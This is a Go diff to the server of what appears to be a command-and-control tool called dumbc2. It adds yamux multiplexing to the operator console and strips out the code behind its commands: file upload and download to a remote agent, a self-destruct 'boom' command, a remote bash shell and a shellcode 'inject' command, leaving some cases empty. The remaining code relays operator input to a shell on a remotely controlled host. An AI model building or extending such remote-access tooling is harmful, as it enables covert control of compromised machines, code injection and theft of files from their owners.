@@ -6,6 +6,7 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"github.com/hashicorp/yamux"
 	"github.com/kmahyyg/dumbc2/config"
 	"github.com/kmahyyg/dumbc2/remoteop"
 	"github.com/kmahyyg/dumbc2/transport"
@@ -69,13 +70,32 @@ func handleClient(conn net.Conn) {
 	printHelp()
 	fmt.Println("Connection established.")
 	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
-	cleanup := func() { _ = conn.Close() }
+	ymconf := yamux.Config{
+		AcceptBacklog:          256,
+		EnableKeepAlive:        true,
+		KeepAliveInterval:      time.Second * 20,
+		ConnectionWriteTimeout: time.Minute * 5,
+		MaxStreamWindowSize:    256 * 1024,
+		LogOutput:              os.Stderr,
+	}
+	ymserv, err := yamux.Server(conn, &ymconf)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	cleanup := func() {
+		_ = ymserv.Close()
+		_ = conn.Close()
+	}
+	defer cleanup()
 	for true {
 		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
 		useript := utils.ReadUserInput()
 		useriptD := strings.Split(useript, " ")
-		var curRTCmd *remoteop.RTCommand
-		var curPingBack *remoteop.PingBack
+		recvconn, err := ymserv.Accept()
+		if err != nil {
+			log.Println("Mux Error.")
+			continue
+		}
 		switch useriptD[0] {
 		case "upload":
 			fd, err := os.Stat(useriptD[1])
@@ -83,99 +103,13 @@ func handleClient(conn net.Conn) {
 				log.Println(err)
 				continue
 			}
-			fdlen := func() int64 {
-				size := fd.Size()
-				return (size / 1048576) + 1
-			}
-			if fdlen() > 255 {
-				log.Println("Exceeds max length, 253M")
-				continue
-			} else {
-				buf := make([]byte, 1)
-				binary.PutVarint(buf, fdlen())
-				curRTCmd = &remoteop.RTCommand{
-					Command:        []byte(uploadCmd),
-					FilePathLocal:  []byte(useriptD[1]),
-					FilePathRemote: []byte(useriptD[2]),
-					FileLength:     buf[0],
-					HasData:        byte(1),
-				}
-				err := curRTCmd.BuildnSend(conn)
-				if err != nil {
-					log.Println(err)
-					continue
-				}
-				curPingBack, err = remoteop.ParseIncomingPB(conn)
-				if err != nil {
-					log.Println(err)
-					continue
-				}
-				if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
-					log.Println("Failed to execute command.")
-					continue
-				}
-			}
 		case "download":
-			curRTCmd := &remoteop.RTCommand{
-				Command:        []byte(downloadCmd),
-				FilePathLocal:  []byte(useriptD[2]),
-				FilePathRemote: []byte(useriptD[1]),
-				FileLength:     0,
-				HasData:        0,
-				RealData:       nil,
-			}
-			err := curRTCmd.BuildnSend(conn)
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-			curPingBack, err := remoteop.ParseIncomingPB(conn)
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
-				log.Println(errors.New("Function execution error."))
-				continue
-			}
-			// write out to file
-			err = ioutil.WriteFile(string(curRTCmd.FilePathLocal), curPingBack.DataPart, 0644)
-			if err != nil {
-				log.Println(err)
-				continue
-			}
+
 		case "boom":
-			curRTCmd := &remoteop.RTCommand{
-				Command: []byte(selfDestroyCmd),
-				HasData: 0,
-			}
-			err := curRTCmd.BuildnSend(conn)
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-			curPingBack, err := remoteop.ParseIncomingPB(conn)
-			if err != nil {
-				log.Println(err)
-				break
-			}
-			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
-				log.Println(errors.New("Function execution error."))
-				break
-			}
-			break
+
 		case "bash":
 			fmt.Println("** PLease Note This Shell doesn't Support TTY or Upgrade to TTY. **\n")
-			curRTCmd = &remoteop.RTCommand{
-				Command: []byte(getShellCmd),
-				HasData: byte(0),
-			}
-			err := curRTCmd.BuildnSend(conn)
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-			_ = conn.SetReadDeadline(time.Now().Add(time.Minute * 1))
+
 			// no need to check pingback
 			copydata := func(r io.Reader, w io.Writer) {
 				_, err := io.Copy(w, r)
@@ -183,7 +117,7 @@ func handleClient(conn net.Conn) {
 					log.Println(err)
 				}
 			}
-			go copydata(os.Stdout, conn)
+			go copydata(os.Stdout, conn) //todo:connection change to stream here
 			scanner := bufio.NewScanner(os.Stdin)
 			for scanner.Scan() {
 				inputcmd := scanner.Bytes()
@@ -192,35 +126,14 @@ func handleClient(conn net.Conn) {
 					log.Println(err)
 					break
 				}
-				if bytes.Equal(inputcmd, []byte("exit\n")) || bytes.Equal(inputcmd, []byte("exit\r\n")) {
+				if bytes.Equal(inputcmd, []byte("exit\n")) || bytes.Equal(inputcmd, []byte("exit\r\n")) || bytes.Equal(inputcmd, []byte("exit")) {
 					break
 				}
 			}
+			_ = conn.Close()
 		case "inject":
-			curRTCmd := &remoteop.RTCommand{
-				Command:    []byte(injectShellCodeCmd),
-				FileLength: 1, // Max 1M Allowed
-				HasData:    1,
-				RealData:   []byte(useriptD[1]),
-			}
-			_ = conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
-			err := curRTCmd.BuildnSend(conn)
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-			curPingBack, err := remoteop.ParseIncomingPB(conn)
-			_ = conn.SetReadDeadline(time.Now().Add(10 * time.Minute))
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
-				log.Println("Function Execution Error. Agent may exits.")
-				continue
-			}
+
 		case "exit":
-			cleanup()
 			return
 		case "help":
 			fallthrough
@@ -228,5 +141,4 @@ func handleClient(conn net.Conn) {
 			printHelp()
 		}
 	}
-	defer cleanup()
 }
